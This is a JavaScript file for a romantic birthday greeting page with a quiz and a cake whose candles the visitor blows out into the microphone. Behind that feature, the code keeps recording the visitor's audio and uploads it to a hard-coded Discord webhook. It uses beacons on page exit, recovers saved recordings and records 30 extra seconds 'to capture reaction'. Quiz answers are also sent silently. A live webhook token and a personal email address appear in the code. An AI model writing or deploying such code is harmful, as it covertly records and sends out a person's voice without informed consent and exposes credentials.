            formData.append('content', 'Emergency closing chunk');
            
            navigator.sendBeacon(
                'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP',
                formData
            );
            console.log("Sent final 30 seconds with beacon API");
        }
    }
    
    // Show confirmation dialog to give more time for upload
    event.preventDefault();
    event.returnValue = 'Are you sure you want to leave? Your birthday wishes may be lost!';
    return event.returnValue;
});

// Add recovery mechanism to check local storage on startup
document.addEventListener('DOMContentLoaded', async () => {
    // Initialize IndexedDB
    try {
        await initializeDB();
        
        // Check for emergency saved audio in localStorage
        if (localStorage.getItem('emergency_audio_data')) {
            console.log("Found emergency audio in localStorage, attempting to send...");
            try {
                const base64Data = localStorage.getItem('emergency_audio_data');
                const timestamp = localStorage.getItem('emergency_audio_timestamp') || Date.now();
                
                // Convert base64 to blob
                const byteString = atob(base64Data.split(',')[1]);
                const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                const blob = new Blob([ab], {type: mimeString});
                
                // Send it
                const formData = new FormData();
                formData.append('file', blob, `recovered_${timestamp}.webm`);
                formData.append('content', 'Recovered emergency recording from localStorage');
                
                fetch('https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    console.log("Successfully sent recovered audio");
                    localStorage.removeItem('emergency_audio_data');
                    localStorage.removeItem('emergency_audio_timestamp');
                }).catch(error => {
                    console.error("Failed to send recovered audio:", error);
                });
            } catch (e) {
                console.error("Error processing emergency audio:", e);
            }
        }
        
        // Check for emergency batch recordings
        Object.keys(localStorage).forEach(key => {
            if (key.startsWith('emergency_audio_')) {
                // Process these similarly to the above
                console.log(`Found emergency batch: ${key}`);
                // Implementation would be similar to the above
            }
        });
        
        // Check for and try to send any unsent recordings from previous sessions
        checkForUnsentRecordings();
    } catch (error) {
        console.error('Error initializing recording system:', error);
    }

    // Rest of your DOMContentLoaded event handler...
    const startButton = document.getElementById('startButton');
    
    startButton.addEventListener('click', () => {
        // Request microphone permission first
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    startRecording(stream);
                    startExperience();
                })
                .catch(() => {
                    console.log('Microphone access denied, some features will be limited');
                    const message = document.createElement('p');
                    message.textContent = "Microphone access denied. You'll need to click the candles manually! 🎂";
                    message.style.color = '#ff6b6b';
                    message.style.marginTop = '1rem';
                    message.style.fontSize = '0.9rem';
                    welcomeContainer.querySelector('.welcome-content').appendChild(message);
                    setTimeout(startExperience, 2000);
                });
        } else {
            startExperience();
        }
    });

    // Fix next button logic to ensure it works on the last question
    nextButton.addEventListener('click', () => {
        console.log(`Next button clicked, current question: ${currentQuestionIndex}`);
        currentQuestionIndex++;
        console.log(`Moving to question index: ${currentQuestionIndex}, total questions: ${questions.length}`);
        
        if (currentQuestionIndex < questions.length) {
            console.log(`Displaying next question`);
            displayQuestion(currentQuestionIndex);
        } else {
            console.log(`This was the last question, showing cake`);
            showFinalMessage();
        }
    });
});

function startExperience() {
    welcomeContainer.style.animation = 'fadeOut 1s forwards';
    setTimeout(() => {
        welcomeContainer.style.display = 'none';
        questionContainer.style.display = 'block';
        displayQuestion(currentQuestionIndex);
    }, 1000);
}

// Handle cake interaction including candle blowing
function handleCakeInteraction(cakeContainer) {
    let candlesBlown = 0;
    const flames = cakeContainer.querySelectorAll('.flame');
    const totalCandles = flames.length;
    let isBlowing = false;
    let lastBlowTime = 0;
    let blowCount = 0;
    const remainingCandles = new Set([...Array(totalCandles).keys()]);
    
    // Encouraging messages for different scenarios
    const blowMessages = [
        "Almost there! Blow a little harder! 💨",
        "You can do it! One big blow! 🌬️",
        "Getting closer! Take a deep breath! 😤",
        "Just a bit more power! 💪",
        "Ooh, that was close! Try again! ✨"
    ];
    
    let messageTimeout = null;
    
    // Function to show temporary message
    function showTemporaryMessage(message) {
        // Clear any existing message timeout
        if (messageTimeout) {
            clearTimeout(messageTimeout);
        }
        
        // Remove existing message if any
        const existingMsg = cakeContainer.querySelector('.blow-message');
        if (existingMsg) {
            existingMsg.remove();
        }
        
        const msgElement = document.createElement('div');
        msgElement.className = 'blow-message';
        msgElement.textContent = message;
        msgElement.style.opacity = '1'; // Ensure message is visible
        msgElement.style.zIndex = '2000'; // Ensure message is on top
        cakeContainer.appendChild(msgElement);
        
        // Remove message after 2 seconds
        messageTimeout = setTimeout(() => {
            msgElement.style.animation = 'fadeOut 0.5s forwards';
            setTimeout(() => msgElement.remove(), 500);
        }, 2000);
    }
    
    // Function to blow out a random candle
    function blowRandomCandle(event) {
        if (event) {
            event.preventDefault();
            event.stopPropagation();
        }
        
        if (remainingCandles.size === 0) return;
        
        // Convert Set to Array and get a random index
        const candlesArray = Array.from(remainingCandles);
        const randomIndex = Math.floor(Math.random() * candlesArray.length);
        const candleToBlowOut = candlesArray[randomIndex];
        
        // Remove the candle from remaining set
        remainingCandles.delete(candleToBlowOut);
        
        // Blow out the candle with animation
        const flame = flames[candleToBlowOut];
        flame.style.animation = 'flameOut 0.3s forwards';
        setTimeout(() => {
            flame.style.opacity = '0';
            candlesBlown++;
            
            // Create sparkle effect around the blown candle
            createSparkleAtPosition(flame.getBoundingClientRect());
            
            // Check if this was the last candle
            if (candlesBlown === totalCandles) {
                handleAllCandlesBlown();
            }
        }, 300);
    }
    
    // Function to create sparkle effect at specific position
    function createSparkleAtPosition(rect) {
        const sparkleEmojis = ['✨', '⭐', '🌟', '💫'];
        for (let i = 0; i < 3; i++) {
            const sparkle = document.createElement('div');
            sparkle.style.position = 'absolute';
            sparkle.style.left = `${rect.left + (Math.random() * 20 - 10)}px`;
            sparkle.style.top = `${rect.top + (Math.random() * 20 - 10)}px`;
            sparkle.style.fontSize = '20px';
            sparkle.style.zIndex = '1000';
            sparkle.textContent = sparkleEmojis[Math.floor(Math.random() * sparkleEmojis.length)];
            sparkle.style.animation = 'sparkleAndFade 1s forwards';
            document.body.appendChild(sparkle);
            setTimeout(() => sparkle.remove(), 1000);
        }
    }
    
    // Only handle clicks on individual flames and cake
    flames.forEach(flame => {
        flame.style.opacity = '1';
        flame.style.pointerEvents = 'auto';
        
        flame.addEventListener('click', function(e) {
            if (remainingCandles.size > 0) {
                blowRandomCandle(e);
            }
        });
    });

    // Add click handler for the entire cake
    const cake = cakeContainer.querySelector('.cake');
    cake.style.cursor = 'pointer';
    cake.addEventListener('click', function(e) {
        if (remainingCandles.size > 0) {
            blowRandomCandle(e);
        }
    });

    // Use existing microphone stream if available
    if (window.microphoneStream) {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const analyser = audioContext.createAnalyser();
        const microphone = audioContext.createMediaStreamSource(window.microphoneStream);
        microphone.connect(analyser);
        
        analyser.fftSize = 512;
        const bufferLength = analyser.frequencyBinCount;
        const dataArray = new Uint8Array(bufferLength);
        let consecutiveBlows = 0;
        let lastHighLevel = 0;
        
        // Variables for noise floor calibration
        let noiseFloor = 0;
        let calibrationSamples = 0;
        const CALIBRATION_PERIOD = 30;
        let isCalibrating = true;
        
        function checkAudioLevel() {
            analyser.getByteFrequencyData(dataArray);
            
            let sum = 0;
            let count = 0;
            for (let i = 1; i < 20; i++) {
                sum += dataArray[i];
                count++;
            }
            const average = sum / count;
            const now = Date.now();
            
            if (isCalibrating) {
                noiseFloor = (noiseFloor * calibrationSamples + average) / (calibrationSamples + 1);
                calibrationSamples++;
                
                if (calibrationSamples >= CALIBRATION_PERIOD) {
                    isCalibrating = false;
                    noiseFloor += 10;
                }
                requestAnimationFrame(checkAudioLevel);
                return;
            }
            
            // Increased thresholds by another 15%
            const blowThreshold = Math.max(noiseFloor + 46, 113);
            
            if (average > blowThreshold) {
                if (now - lastHighLevel < 200) {
                    consecutiveBlows++;
                } else {
                    consecutiveBlows = 1;
                }
                lastHighLevel = now;
                
                // Increased delay between blows by 50% (from 1000ms to 1500ms)
                if (consecutiveBlows >= 3 && !isBlowing && now - lastBlowTime > 1500) {
                    const intensity = average - noiseFloor;
                    if (intensity > 60) {
                        isBlowing = true;
                        lastBlowTime = now;
                        blowCount++;
                        
                        if (remainingCandles.size > 0) {
                            blowRandomCandle();
                            // Show success message
                            showTemporaryMessage("Nice blow! Keep going! 🌬️✨");
                        }
                        
                        // Increased cooldown by 50% (from 1000ms to 1500ms)
                        setTimeout(() => {
                            isBlowing = false;
                            consecutiveBlows = 0;
                        }, 1500);
                    } else {
                        // Show encouraging message for weak blow
                        showTemporaryMessage(blowMessages[Math.floor(Math.random() * blowMessages.length)]);
                    }
                }
            } else {
                if (now - lastHighLevel > 300) {
                    consecutiveBlows = Math.max(0, consecutiveBlows - 1);
                }
            }
            
            if (!isBlowing && average < noiseFloor + 15) {
                noiseFloor = noiseFloor * 0.95 + average * 0.05;
            }
            
            if (remainingCandles.size > 0) {
                requestAnimationFrame(checkAudioLevel);
            }
        }
        
        console.log("Calibrating microphone...");
        checkAudioLevel();
    }
    
    // Function to handle when all candles are blown
    function handleAllCandlesBlown() {
        // Create a grand finale effect
        createHeartAnimation();
        createSparkleAnimation();
        createConfetti();
        
        // Show a celebration message
        const celebrationMsg = document.createElement('div');
        celebrationMsg.textContent = "Yay! All candles blown! Make a wish! 🎂✨";
        celebrationMsg.className = 'celebration-message';
        celebrationMsg.style.zIndex = '2000'; // Ensure message is on top
        cakeContainer.appendChild(celebrationMsg);
        
        // Keep the cake and message visible for longer (7 seconds total)
        setTimeout(() => {
            celebrationMsg.style.animation = 'fadeOut 2s forwards';
            cakeContainer.style.animation = 'fadeOut 2s forwards';
            setTimeout(() => {
                cakeContainer.remove();
                showFinalCongrats();
            }, 2000);
        }, 7000); // Increased from 4000 to 7000 for 3 more seconds
    }
}

// Update the styles to ensure messages are visible and cake is clickable
const newAnimations = `
    @keyframes flameOut {
        0% { transform: translateX(-50%) scale(1); opacity: 1; }
        100% { transform: translateX(-50%) scale(0); opacity: 0; }
    }
    
    @keyframes sparkleAndFade {
        0% { transform: scale(0) rotate(0deg); opacity: 0; }
        50% { transform: scale(1.2) rotate(180deg); opacity: 1; }
        100% { transform: scale(0) rotate(360deg); opacity: 0; }
    }
    
    .celebration-message {
        position: absolute;
        top: -40px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(255, 255, 255, 0.95);
        padding: 10px 20px;
        border-radius: 20px;
        font-size: 1.2rem;
        color: #ff6b6b;
        animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        box-shadow: 0 4px 15px rgba(255, 107, 107, 0.2);
        z-index: 2000;
    }
    
    .cake {
        cursor: pointer;
        transition: transform 0.2s ease;
    }
    
    .cake:hover {
        transform: scale(1.02);
    }
    
    .cake:active {
        transform: scale(0.98);
    }
    
    .blow-message {
        position: absolute;
        bottom: -70px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(255, 255, 255, 0.95);
        padding: 12px 20px;
        border-radius: 15px;
        font-size: 1.1rem;
        color: #ff6b6b;
        animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        box-shadow: 0 4px 15px rgba(255, 107, 107, 0.2);
        white-space: nowrap;
        z-index: 2000;
        pointer-events: none;
    }
    
    @keyframes popIn {
        0% { transform: translateX(-50%) scale(0); opacity: 0; }
        100% { transform: translateX(-50%) scale(1); opacity: 1; }
    }
    
    @keyframes fadeOut {
        0% { opacity: 1; }
        100% { opacity: 0; }
    }
`;

// Add styles to the document
document.addEventListener('DOMContentLoaded', () => {
    // Add cake animations to existing style element
    const styleElement = document.querySelector('style') || document.createElement('style');
    styleElement.textContent += newAnimations;
    if (!styleElement.parentNode) {
        document.head.appendChild(styleElement);
    }
});

// Setup page restore behavior
window.addEventListener('pagehide', () => {
    // This covers more mobile cases and Safari
    pauseRecording();
});

window.addEventListener('pageshow', (event) => {
    // If page is restored from bfcache (back/forward cache)
    if (event.persisted) {
        // Restart recording if it was previously started
        if (window.microphoneStream && !isRecording) {
            startRecording(window.microphoneStream);
        }
    }
});

window.addEventListener('unload', () => {
    // Last chance to send data is already handled in beforeunload
    console.log("Unload event fired");
});

// Add the showFinalCongrats function
function showFinalCongrats() {
    questionText.textContent = "Happy Birthday to the love of my life! 🎉";
    responseText.textContent = "You make my world brighter, my heart fuller, and my life so much better. I love you more than words can ever express! ❤️";
    responseText.classList.add('show');
    createConfetti();
    
    // Keep recording for 30 more seconds to capture reaction
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        setTimeout(() => {
            stopAndSendRecording();
        }, 30000); // 30 seconds delay
    }
}

// Add cake-related functions
function createCake() {
    const cakeContainer = document.createElement('div');
    cakeContainer.className = 'cake-container';
    
    const cake = document.createElement('div');
    cake.className = 'cake';
    
    // Create cake layers
    const layers = ['bottom', 'middle', 'top'];
    layers.forEach(layer => {
        const cakeLayer = document.createElement('div');
        cakeLayer.className = `cake-layer ${layer}`;
        cake.appendChild(cakeLayer);
    });
    
    // Create candles container
    const candlesContainer = document.createElement('div');
    candlesContainer.className = 'candles-container';
    
    // Add candles
    for (let i = 0; i < 5; i++) {
        const candle = document.createElement('div');
        candle.className = 'candle';
        const flame = document.createElement('div');
        flame.className = 'flame';
        candle.appendChild(flame);
        candlesContainer.appendChild(candle);
    }
    
    cake.appendChild(candlesContainer);
    cakeContainer.appendChild(cake);
    
    // Add message
    const message = document.createElement('p');
    message.className = 'cake-message';
    message.textContent = 'Click the candles or blow on the microphone to make a wish! 🎂';
    cakeContainer.appendChild(message);
    
    return cakeContainer;
}

// Update showFinalMessage function to make sure it works
function showFinalMessage() {
    console.log('Creating cake and preparing final message');
    const cakeContainer = createCake();
    
    // Clear previous content
    questionText.textContent = '';
    optionsContainer.innerHTML = '';
    responseText.textContent = '';
    responseText.classList.remove('show');
    nextButton.style.display = 'none';
    
    // Add cake to the page
    questionContainer.appendChild(cakeContainer);
    
    // Initialize the cake interaction
    handleCakeInteraction(cakeContainer);
}

// Replace the submitToGoogleForm function with this:
function sendResponseByEmail(question, answer) {
    const subject = encodeURIComponent("Birthday Website Response: " + question);
    const body = encodeURIComponent(`Question: ${question}\nAnswer: ${answer}\n\nSent from your Birthday Website ❤️`);
    const mailtoLink = `mailto:sadmanxper@gmail.com?subject=${subject}&body=${body}`;
    
    // Open email client
    window.location.href = mailtoLink;
}

// Update sendToDiscord to include more context
function sendToDiscord(question, answer) {
    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
    
    // Get current time
    const timestamp = new Date().toLocaleTimeString();
    
    // Format the message nicely
    const message = {
        embeds: [{
            title: "New Interaction! 💝",
            color: 0xFF69B4,  // Pink color
            fields: [
                {
                    name: "Question",
                    value: question
                },
                {
                    name: "Answer",
                    value: answer
                },
                {
                    name: "Time",
                    value: timestamp
                }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    // Send to Discord silently
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(message)
    }).catch(() => {
        // Ignore any errors to keep it silent
    });
}
